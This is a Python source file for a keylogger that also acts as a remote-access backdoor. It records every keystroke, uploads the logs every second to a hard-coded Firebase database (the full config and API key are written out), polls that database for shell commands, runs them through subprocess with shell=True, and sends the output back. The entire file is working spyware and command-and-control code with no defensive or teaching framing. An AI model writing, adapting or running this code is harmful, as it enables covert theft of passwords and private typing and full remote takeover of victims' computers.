import os
import subprocess
import keyboard  # for keylogs
import smtplib  # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an interval amount of time
from threading import Timer
from datetime import datetime
import random
import asyncio
import pyrebase

SEND_REPORT_EVERY = 1  # in seconds, 60 means 1 minute and so on
id = str(random.random()).split("0.")[1]

async def RceEventLoop():
    task = asyncio.create_task(RCE_CHECKER())
async def RCE_CHECKER():
    retrieved = RCE().verify()
    if retrieved != None:
        print(retrieved)
        CommandDoer(retrieved)
def CommandDoer(cmd):
    if "cd"==cmd[:2]:
        try:os.chdir(cmd.split(" ")[1]);cmd_output= f"Entered {cmd.split(' ')[1]}"
        except:cmd_output="No such path or directory"
    else:
        cmd_output,err= subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE ).communicate()
        err = err.decode("utf-8")
        if err=="":
            cmd_output = cmd_output.decode("utf-8")
        else:
            cmd_output = err
    print("Loading Content to server")
    rce = RCE()
    rce.updateRceID()
    rce.pusher(cmd_output)

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all
        # the keystrokes within self.interval
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]"
            elif name == "decimal":
                name = "."
            elif name == "backspace":
                if len(self.log)>0:
                    self.log = self.log[:len(self.log)-1]
                name = ""
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global self.log variable
        self.log += name

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the self.log variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
    def report(self):
        """
        This function gets called every self.interval
        It basically sends keylogs and resets self.log variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update self.filename
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                RCE().report(self.log)
            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        asyncio.run(RceEventLoop())
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        #updating data and new id to RCE firebase database
        RCEVar= RCE()
        RCEVar.updateRceID()
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
# block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

class RCE:
    def __init__(self):
        self.firebaseConfig = {
            "apiKey": "AIzaSyAsG9YgF27wACWPAJrGhgrLYzHbH9vbGOw",

            "authDomain": "keylogger-8d7ca.firebaseapp.com",

            "projectId": "keylogger-8d7ca",

            "storageBucket": "keylogger-8d7ca.appspot.com",

            "messagingSenderId": "40649690396",

            "appId": "1:40649690396:web:d4988f297998145354fed9",

            "measurementId": "G-9HXCFBHW21",


            "databaseURL": "https://keylogger-8d7ca-default-rtdb.firebaseio.com"

        }
        firebase = pyrebase.initialize_app(self.firebaseConfig)
        self.db = firebase.database()

    def verify(self):
        retreived = self.db.child("RCE").child(id).get().val()["command"]
        if retreived != "" and retreived != "None":
            return retreived
        else:
            return None
    def updateRceID(self):
        self.db.child("RCE").child(id).set({"command":"None"})
        self.db.child("Current").update({"id":id})
        self.db.child("Keylog").child(id).set({"logs":""})
    def pusher(self, data):
        content = {"returned":data}
        self.db.child("RCE").child(id).update(content)
    def report(self,log):
        print("Loading Out Data to FireBase")
        logs = self.db.child("Keylog").child(id).get().val()["logs"]
        reports = {"logs":logs+log}
        self.db.child("Keylog").child(id).update(reports)
if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
